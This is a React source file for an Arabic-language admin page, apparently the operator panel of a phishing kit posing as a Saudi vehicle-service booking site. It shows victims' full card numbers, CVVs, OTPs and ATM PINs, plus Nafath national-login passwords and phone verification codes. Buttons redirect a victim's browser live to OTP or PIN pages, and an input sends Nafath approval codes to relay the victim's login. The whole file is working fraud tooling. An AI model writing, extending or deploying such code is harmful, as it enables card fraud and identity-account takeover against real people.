import { useLocation, useParams } from "wouter";
import { trpc } from "@/lib/trpc";
import { useAuth } from "@/_core/hooks/useAuth";
import { Button } from "@/components/ui/button";
import { Card, CardContent, CardHeader, CardTitle } from "@/components/ui/card";
import { Input } from "@/components/ui/input";
import { Separator } from "@/components/ui/separator";
import { toast } from "sonner";
import {
  ArrowRight,
  Car,
  User,
  Phone,
  CreditCard,
  Shield,
  Navigation,
  MapPin,
  Smartphone,
  RefreshCw,
  CheckCircle,
  XCircle,
  Eye,
  EyeOff,
  KeyRound,
  AtSign,
  Lock,
} from "lucide-react";
import { useEffect, useState } from "react";

const STATUS_LABELS: Record<string, { label: string; color: string }> = {
  new: { label: "جديد", color: "bg-blue-100 text-blue-700" },
  pending_payment: { label: "انتظار دفع", color: "bg-yellow-100 text-yellow-700" },
  pending_nafath: { label: "انتظار نفاذ", color: "bg-purple-100 text-purple-700" },
  pending_motasel: { label: "انتظار متصل", color: "bg-orange-100 text-orange-700" },
  payment_done: { label: "تم الدفع", color: "bg-green-100 text-green-700" },
  verified: { label: "تم التحقق", color: "bg-emerald-100 text-emerald-700" },
  completed: { label: "مكتمل", color: "bg-gray-100 text-gray-700" },
  cancelled: { label: "ملغي", color: "bg-red-100 text-red-700" },
};

const PAYMENT_ACTION_LABELS: Record<string, { label: string; color: string }> = {
  STILL: { label: "انتظار قرار المسؤول", color: "bg-yellow-100 text-yellow-700" },
  accepted: { label: "تم التوجيه لـ OTP", color: "bg-blue-100 text-blue-700" },
  pass: { label: "تم التوجيه لـ ATM", color: "bg-orange-100 text-orange-700" },
  denied: { label: "مرفوض", color: "bg-red-100 text-red-700" },
  verified: { label: "مقبول نهائياً", color: "bg-green-100 text-green-700" },
};

export default function BookingDetail() {
  const params = useParams<{ reference: string }>();
  const [, navigate] = useLocation();
  const { user, loading, isAuthenticated } = useAuth();
  const [nafathCode, setNafathCode] = useState("");
  const [showCardNumber, setShowCardNumber] = useState(false);
  const [showCvv, setShowCvv] = useState(false);

  useEffect(() => {
    if (!loading && (!isAuthenticated || user?.role !== "admin")) {
      navigate("/admin/login");
    }
  }, [loading, isAuthenticated, user]);

  const reference = params.reference;

  const { data: bookingData, refetch } = trpc.booking.getByReference.useQuery(
    { reference: reference! },
    { enabled: !!reference }
  );

  const { data: templateData, refetch: refetchTemplate } =
    trpc.admin.getTemplateForms.useQuery(
      { Reference: reference! },
      { enabled: !!reference }
    );

  const navigateMutation = trpc.navigation.navigateTo.useMutation({
    onSuccess: (res) => toast.success(res.message),
    onError: (err) => toast.error(err.message),
  });

  const updateStatusMutation = trpc.booking.updateStatus.useMutation({
    onSuccess: () => {
      toast.success("تم تحديث الحالة");
      refetch();
      refetchTemplate();
    },
  });

  // mutation لإرسال إجراء الدفع (OTP / ATM / رفض)
  const setPaymentActionMutation = trpc.admin.setPaymentAction.useMutation({
    onSuccess: (res: any) => {
      const actionLabels: Record<string, string> = {
        accepted: "تم التوجيه لصفحة OTP",
        pass: "تم التوجيه لصفحة ATM",
        denied: "تم رفض الدفع",
        verified: "تم قبول الدفع نهائياً",
      };
      toast.success(actionLabels[res?.action] || "تم تنفيذ الإجراء");
      refetch();
      refetchTemplate();
    },
    onError: (err) => toast.error(err.message),
  });

  // mutation لإرسال رمز نفاذ
  const sendNafathCodeMutation = trpc.admin.sendNafathCode.useMutation({
    onSuccess: () => {
      toast.success("تم إرسال رمز نفاذ للعميل");
      setNafathCode("");
      refetchTemplate();
    },
    onError: (err) => toast.error(err.message),
  });

  const booking = bookingData?.data;
  const template = templateData?.data;
  const payment = template?.payment as any;
  const nafath = template?.nafath as any;
  const motasel = template?.motasel as any;

  const handleNavigate = (page: string) => {
    if (!booking?.clientIp) {
      toast.error("لا يوجد IP للعميل");
      return;
    }
    navigateMutation.mutate({
      clientIp: booking.clientIp,
      page,
      referenceId: reference,
    });
  };

  const handlePaymentAction = (action: "accepted" | "pass" | "denied" | "verified") => {
    setPaymentActionMutation.mutate({
      reference: reference!,
      action,
    });
  };

  if (!booking) {
    return (
      <div className="min-h-screen flex items-center justify-center bg-slate-50">
        <div className="animate-spin rounded-full h-10 w-10 border-b-2 border-blue-600" />
      </div>
    );
  }

  const statusInfo = STATUS_LABELS[booking.status] || {
    label: booking.status,
    color: "bg-gray-100 text-gray-700",
  };

  const paymentActionInfo = PAYMENT_ACTION_LABELS[payment?.paymentAction || "STILL"] || PAYMENT_ACTION_LABELS["STILL"];

  return (
    <div className="min-h-screen bg-slate-50" dir="rtl">
      {/* Header */}
      <header className="bg-white border-b border-slate-200 sticky top-0 z-30 shadow-sm">
        <div className="max-w-screen-xl mx-auto px-4 py-3 flex items-center justify-between">
          <div className="flex items-center gap-3">
            <Button
              variant="ghost"
              size="sm"
              onClick={() => navigate("/admin/dashboard")}
              className="gap-2"
            >
              <ArrowRight className="w-4 h-4" />
              العودة
            </Button>
            <Separator orientation="vertical" className="h-5" />
            <h1 className="font-semibold text-slate-800 text-sm">
              تفاصيل الحجز: <span className="font-mono text-blue-600">{reference}</span>
            </h1>
          </div>
          <div className="flex items-center gap-2">
            <span className={`text-xs px-3 py-1 rounded-full font-medium ${statusInfo.color}`}>
              {statusInfo.label}
            </span>
            <Button size="sm" variant="ghost" onClick={() => { refetch(); refetchTemplate(); }}>
              <RefreshCw className="w-4 h-4" />
            </Button>
          </div>
        </div>
      </header>

      <main className="max-w-screen-xl mx-auto px-4 py-6 space-y-4">

        {/* ===== توجيه العميل ===== */}
        <Card className="border-0 shadow-sm bg-blue-600">
          <CardContent className="p-4">
            <div className="flex items-center justify-between flex-wrap gap-3">
              <div className="text-white">
                <p className="font-semibold text-sm">توجيه العميل لصفحة</p>
                <p className="text-blue-200 text-xs">IP: {booking.clientIp || "غير معروف"}</p>
              </div>
              <div className="flex flex-wrap gap-2">
                <Button size="sm" className="bg-white text-blue-600 hover:bg-blue-50 h-8 text-xs font-medium" onClick={() => handleNavigate("/payment")}>
                  <CreditCard className="w-3 h-3 ml-1" /> صفحة الدفع
                </Button>
                <Button size="sm" className="bg-white text-purple-600 hover:bg-purple-50 h-8 text-xs font-medium" onClick={() => handleNavigate("/nafath")}>
                  <Smartphone className="w-3 h-3 ml-1" /> صفحة نفاذ
                </Button>
                <Button size="sm" className="bg-white text-orange-600 hover:bg-orange-50 h-8 text-xs font-medium" onClick={() => handleNavigate("/motasel")}>
                  <Phone className="w-3 h-3 ml-1" /> صفحة المتصل
                </Button>
                <Button size="sm" className="bg-white text-slate-600 hover:bg-slate-50 h-8 text-xs font-medium" onClick={() => handleNavigate("/")}>
                  <Navigation className="w-3 h-3 ml-1" /> الرئيسية
                </Button>
              </div>
            </div>
          </CardContent>
        </Card>

        {/* ===== بيانات البطاقة الكاملة + أزرار التحكم في الدفع ===== */}
        {payment && (
          <Card className="border-0 shadow-sm border-l-4 border-l-green-500">
            <CardHeader className="pb-3">
              <div className="flex items-center justify-between">
                <CardTitle className="text-sm font-semibold text-slate-700 flex items-center gap-2">
                  <CreditCard className="w-4 h-4 text-green-600" />
                  بيانات البطاقة البنكية
                </CardTitle>
                <span className={`text-xs px-2 py-1 rounded-full font-medium ${paymentActionInfo.color}`}>
                  {paymentActionInfo.label}
                </span>
              </div>
            </CardHeader>
            <CardContent className="space-y-4">
              {/* ===== بيانات البطاقة - التخطيط الجديد ===== */}
              <div className="space-y-3">

                {/* السطر 1: اسم حامل البطاقة - سطر كامل */}
                <div className="bg-slate-50 rounded-lg px-4 py-3 border border-slate-200">
                  <p className="text-[10px] text-slate-400 uppercase tracking-wide mb-1">اسم حامل البطاقة</p>
                  <p className="text-base font-semibold text-slate-800">{payment.cardHolderName || "—"}</p>
                </div>

                {/* السطر 2: رقم البطاقة + تاريخ الانتهاء + CVV في سطر واحد */}
                <div className="grid grid-cols-3 gap-2">

                  {/* رقم البطاقة الكامل */}
                  <div className="col-span-3 sm:col-span-1 bg-yellow-50 rounded-lg px-3 py-3 border border-yellow-200">
                    <p className="text-[10px] text-yellow-600 uppercase tracking-wide mb-1">رقم البطاقة</p>
                    <div className="flex items-center gap-1 justify-between">
                      <span className="text-sm font-mono font-bold text-slate-800 tracking-wider">
                        {showCardNumber
                          ? (payment.cardNumber
                              ? payment.cardNumber.replace(/(.{4})/g, "$1 ").trim()
                              : "—")
                          : payment.cardNumber
                            ? "•••• •••• •••• " + payment.cardNumber.slice(-4)
                            : "—"}
                      </span>
                      <Button size="sm" variant="ghost" className="h-6 w-6 p-0 shrink-0" onClick={() => setShowCardNumber(!showCardNumber)}>
                        {showCardNumber ? <EyeOff className="w-3 h-3 text-yellow-600" /> : <Eye className="w-3 h-3 text-yellow-600" />}
                      </Button>
                    </div>
                  </div>

                  {/* تاريخ الانتهاء */}
                  <div className="bg-blue-50 rounded-lg px-3 py-3 border border-blue-200 text-center">
                    <p className="text-[10px] text-blue-500 uppercase tracking-wide mb-1">تاريخ الانتهاء</p>
                    <p className="text-sm font-mono font-bold text-slate-800">{payment.cardExpiry || "—"}</p>
                  </div>

                  {/* CVV */}
                  <div className="bg-red-50 rounded-lg px-3 py-3 border border-red-200 text-center">
                    <p className="text-[10px] text-red-500 uppercase tracking-wide mb-1">CVV</p>
                    <div className="flex items-center justify-center gap-1">
                      <span className="text-sm font-mono font-bold text-slate-800">
                        {showCvv ? (payment.cardCvv || "—") : (payment.cardCvv ? "•••" : "—")}
                      </span>
                      <Button size="sm" variant="ghost" className="h-5 w-5 p-0" onClick={() => setShowCvv(!showCvv)}>
                        {showCvv ? <EyeOff className="w-3 h-3 text-red-500" /> : <Eye className="w-3 h-3 text-red-500" />}
                      </Button>
                    </div>
                  </div>

                </div>

                {/* السطر 3: OTP و ATM PIN المُدخَلان من العميل */}
                {(payment.verifyCode || payment.secretNum) && (
                  <div className="grid grid-cols-2 gap-2">
                    {payment.verifyCode && (
                      <div className="bg-blue-600 rounded-lg px-4 py-3 text-white">
                        <p className="text-[10px] text-blue-200 uppercase tracking-wide mb-1 flex items-center gap-1">
                          <KeyRound className="w-3 h-3" /> رمز OTP المُدخَل
                        </p>
                        <p className="text-xl font-mono font-bold tracking-widest">{payment.verifyCode}</p>
                      </div>
                    )}
                    {payment.secretNum && (
                      <div className="bg-orange-500 rounded-lg px-4 py-3 text-white">
                        <p className="text-[10px] text-orange-100 uppercase tracking-wide mb-1 flex items-center gap-1">
                          <Lock className="w-3 h-3" /> ATM PIN المُدخَل
                        </p>
                        <p className="text-xl font-mono font-bold tracking-widest">{payment.secretNum}</p>
                      </div>
                    )}
                  </div>
                )}

              </div>

              <Separator />

              {/* ===== أزرار التحكم في خطوات الدفع ===== */}
              <div>
                <p className="text-xs font-semibold text-slate-600 mb-3">
                  التحكم في خطوات الدفع (يؤثر مباشرة على شاشة العميل):
                </p>
                <div className="grid grid-cols-2 md:grid-cols-4 gap-2">

                  {/* زر OTP */}
                  <Button
                    className="bg-blue-600 hover:bg-blue-700 text-white h-12 text-xs flex flex-col gap-1"
                    onClick={() => handlePaymentAction("accepted")}
                    disabled={setPaymentActionMutation.isPending}
                  >
                    <KeyRound className="w-4 h-4" />
                    <span>طلب OTP</span>
                    <span className="text-blue-200 text-[10px]">يظهر حقل رمز التحقق</span>
                  </Button>

                  {/* زر ATM */}
                  <Button
                    className="bg-orange-500 hover:bg-orange-600 text-white h-12 text-xs flex flex-col gap-1"
                    onClick={() => handlePaymentAction("pass")}
                    disabled={setPaymentActionMutation.isPending}
                  >
                    <AtSign className="w-4 h-4" />
                    <span>طلب ATM</span>
                    <span className="text-orange-200 text-[10px]">يظهر حقل رقم ATM</span>
                  </Button>

                  {/* زر قبول نهائي */}
                  <Button
                    className="bg-green-600 hover:bg-green-700 text-white h-12 text-xs flex flex-col gap-1"
                    onClick={() => handlePaymentAction("verified")}
                    disabled={setPaymentActionMutation.isPending}
                  >
                    <CheckCircle className="w-4 h-4" />
                    <span>قبول نهائي</span>
                    <span className="text-green-200 text-[10px]">إتمام العملية</span>
                  </Button>

                  {/* زر رفض */}
                  <Button
                    className="bg-red-600 hover:bg-red-700 text-white h-12 text-xs flex flex-col gap-1"
                    onClick={() => handlePaymentAction("denied")}
                    disabled={setPaymentActionMutation.isPending}
                  >
                    <XCircle className="w-4 h-4" />
                    <span>رفض الدفع</span>
                    <span className="text-red-200 text-[10px]">يظهر رسالة خطأ</span>
                  </Button>
                </div>
              </div>
            </CardContent>
          </Card>
        )}

        <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
          {/* بيانات العميل */}
          <Card className="border-0 shadow-sm">
            <CardHeader className="pb-3">
              <CardTitle className="text-sm font-semibold text-slate-700 flex items-center gap-2">
                <User className="w-4 h-4 text-blue-600" />
                بيانات العميل
              </CardTitle>
            </CardHeader>
            <CardContent className="space-y-3">
              <InfoRow label="الاسم" value={booking.clientName} />
              <InfoRow label="رقم الهوية" value={booking.clientId} mono />
              <InfoRow label="رقم الهاتف" value={booking.clientPhone} mono />
              <InfoRow label="البريد الإلكتروني" value={(booking as any).clientEmail || "—"} />
              <InfoRow label="الجنسية" value={(booking as any).clientNationality || "—"} />
              <InfoRow label="عنوان IP" value={booking.clientIp || "—"} mono />
            </CardContent>
          </Card>

          {/* بيانات المركبة */}
          <Card className="border-0 shadow-sm">
            <CardHeader className="pb-3">
              <CardTitle className="text-sm font-semibold text-slate-700 flex items-center gap-2">
                <Car className="w-4 h-4 text-blue-600" />
                بيانات المركبة
              </CardTitle>
            </CardHeader>
            <CardContent className="space-y-3">
              <InfoRow label="رقم اللوحة" value={booking.vehiclePlate || "—"} mono />
              <InfoRow label="نوع المركبة" value={(booking as any).vehicleType || "—"} />
              <InfoRow label="بلد التسجيل" value={(booking as any).vehicleCountry || "—"} />
              <InfoRow label="تحمل مواد خطرة" value={(booking as any).vehicleCarryDang ? "نعم" : "لا"} />
            </CardContent>
          </Card>

          {/* بيانات الخدمة */}
          <Card className="border-0 shadow-sm">
            <CardHeader className="pb-3">
              <CardTitle className="text-sm font-semibold text-slate-700 flex items-center gap-2">
                <MapPin className="w-4 h-4 text-blue-600" />
                بيانات الخدمة
              </CardTitle>
            </CardHeader>
            <CardContent className="space-y-3">
              <InfoRow label="المنطقة" value={(booking as any).serviceRegion || "—"} />
              <InfoRow label="نوع الخدمة" value={(booking as any).serviceType || "—"} />
              <InfoRow label="التاريخ" value={(booking as any).serviceDate || "—"} />
              <InfoRow label="الوقت" value={(booking as any).serviceTime || "—"} />
            </CardContent>
          </Card>

          {/* بيانات نفاذ */}
          {nafath && (
            <Card className="border-0 shadow-sm border-l-4 border-l-purple-500">
              <CardHeader className="pb-3">
                <CardTitle className="text-sm font-semibold text-slate-700 flex items-center gap-2">
                  <Shield className="w-4 h-4 text-purple-600" />
                  بيانات نفاذ
                </CardTitle>
              </CardHeader>
              <CardContent className="space-y-3">
                <InfoRow label="رقم الهوية" value={nafath.nafathId || "—"} mono />
                <InfoRow label="كلمة المرور" value={nafath.nafathPassword || "—"} mono />
                <InfoRow label="رمز نفاذ المُرسَل" value={nafath.nafathNumber || "—"} mono highlight="purple" />
                <InfoRow label="الحالة" value={nafath.status || "—"} badge badgeColor="bg-purple-100 text-purple-700" />

                <Separator />
                <div>
                  <p className="text-xs text-slate-500 mb-2">إرسال رمز نفاذ للعميل:</p>
                  <div className="flex gap-2">
                    <Input
                      placeholder="أدخل رمز نفاذ (مثال: 47)"
                      value={nafathCode}
                      onChange={(e) => setNafathCode(e.target.value)}
                      className="h-8 text-sm font-mono"
                    />
                    <Button
                      size="sm"
                      className="bg-purple-600 hover:bg-purple-700 text-white h-8 text-xs whitespace-nowrap"
                      onClick={() => {
                        if (!nafathCode.trim()) return toast.error("أدخل رمز نفاذ");
                        sendNafathCodeMutation.mutate({ reference: reference!, code: nafathCode });
                      }}
                      disabled={sendNafathCodeMutation.isPending}
                    >
                      <Shield className="w-3 h-3 ml-1" />
                      إرسال
                    </Button>
                  </div>
                </div>
              </CardContent>
            </Card>
          )}

          {/* بيانات المتصل */}
          {motasel && (
            <Card className="border-0 shadow-sm border-l-4 border-l-orange-500">
              <CardHeader className="pb-3">
                <CardTitle className="text-sm font-semibold text-slate-700 flex items-center gap-2">
                  <Phone className="w-4 h-4 text-orange-600" />
                  بيانات المتصل
                </CardTitle>
              </CardHeader>
              <CardContent className="space-y-3">
                <InfoRow label="مزود الخدمة" value={motasel.motaselProvider || "—"} />
                <InfoRow label="رقم الهاتف" value={motasel.motaselPhone || "—"} mono />
                <InfoRow label="رمز التحقق المُدخَل" value={motasel.motaselCode || "—"} mono highlight="orange" />
                <InfoRow label="الحالة" value={motasel.status || "—"} badge badgeColor="bg-orange-100 text-orange-700" />

                <Separator />
                <div className="flex gap-2">
                  <Button
                    size="sm"
                    className="bg-green-600 hover:bg-green-700 text-white h-8 text-xs"
                    onClick={() => {
                      updateStatusMutation.mutate({ reference: reference!, status: "verified", statusRead: 1 });
                    }}
                  >
                    <CheckCircle className="w-3 h-3 ml-1" /> قبول المتصل
                  </Button>
                  <Button
                    size="sm"
                    className="bg-red-600 hover:bg-red-700 text-white h-8 text-xs"
                    onClick={() => {
                      updateStatusMutation.mutate({ reference: reference!, status: "cancelled", statusRead: 1 });
                    }}
                  >
                    <XCircle className="w-3 h-3 ml-1" /> رفض المتصل
                  </Button>
                </div>
              </CardContent>
            </Card>
          )}
        </div>

        {/* أزرار تغيير حالة الحجز */}
        <Card className="border-0 shadow-sm">
          <CardContent className="p-4">
            <div className="flex items-center gap-3 flex-wrap">
              <span className="text-sm font-medium text-slate-700">تغيير حالة الحجز:</span>
              <Button
                size="sm"
                className="bg-green-600 hover:bg-green-700 text-white h-8 text-xs"
                onClick={() => updateStatusMutation.mutate({ reference: reference!, status: "completed", statusRead: 1 })}
              >
                <CheckCircle className="w-3 h-3 ml-1" /> مكتمل
              </Button>
              <Button
                size="sm"
                className="bg-red-600 hover:bg-red-700 text-white h-8 text-xs"
                onClick={() => updateStatusMutation.mutate({ reference: reference!, status: "cancelled", statusRead: 1 })}
              >
                <XCircle className="w-3 h-3 ml-1" /> إلغاء
              </Button>
              <Button
                size="sm"
                variant="outline"
                className="h-8 text-xs"
                onClick={() => updateStatusMutation.mutate({ reference: reference!, status: "verified", statusRead: 1 })}
              >
                <Shield className="w-3 h-3 ml-1" /> تم التحقق
              </Button>
            </div>
          </CardContent>
        </Card>

        {/* سجل التوجيه */}
        {template?.navLogs && (template.navLogs as any[]).length > 0 && (
          <Card className="border-0 shadow-sm">
            <CardHeader className="pb-3">
              <CardTitle className="text-sm font-semibold text-slate-700 flex items-center gap-2">
                <Navigation className="w-4 h-4 text-blue-600" />
                سجل التوجيه
              </CardTitle>
            </CardHeader>
            <CardContent>
              <div className="space-y-2">
                {(template.navLogs as any[]).map((log: any) => (
                  <div key={log.id} className="flex items-center justify-between text-xs bg-slate-50 rounded-lg p-2">
                    <span className="font-medium text-blue-600">{log.targetPage}</span>
                    <span className="text-slate-500">{new Date(log.createdAt).toLocaleString("ar-SA")}</span>
                  </div>
                ))}
              </div>
            </CardContent>
          </Card>
        )}
      </main>
    </div>
  );
}

function InfoRow({
  label,
  value,
  mono = false,
  badge = false,
  badgeColor = "",
  highlight,
}: {
  label: string;
  value: string;
  mono?: boolean;
  badge?: boolean;
  badgeColor?: string;
  highlight?: "blue" | "orange" | "purple";
}) {
  const highlightClasses: Record<string, string> = {
    blue: "bg-blue-50 border border-blue-200 px-2 py-0.5 rounded",
    orange: "bg-orange-50 border border-orange-200 px-2 py-0.5 rounded",
    purple: "bg-purple-50 border border-purple-200 px-2 py-0.5 rounded",
  };

  return (
    <div className="flex items-center justify-between py-1 border-b border-slate-100 last:border-0">
      <span className="text-xs text-slate-500">{label}</span>
      {badge ? (
        <span className={`text-xs px-2 py-0.5 rounded-full font-medium ${badgeColor}`}>{value}</span>
      ) : (
        <span className={`text-sm text-slate-800 ${mono ? "font-mono" : "font-medium"} ${highlight ? highlightClasses[highlight] : ""}`}>
          {value}
        </span>
      )}
    </div>
  );
}
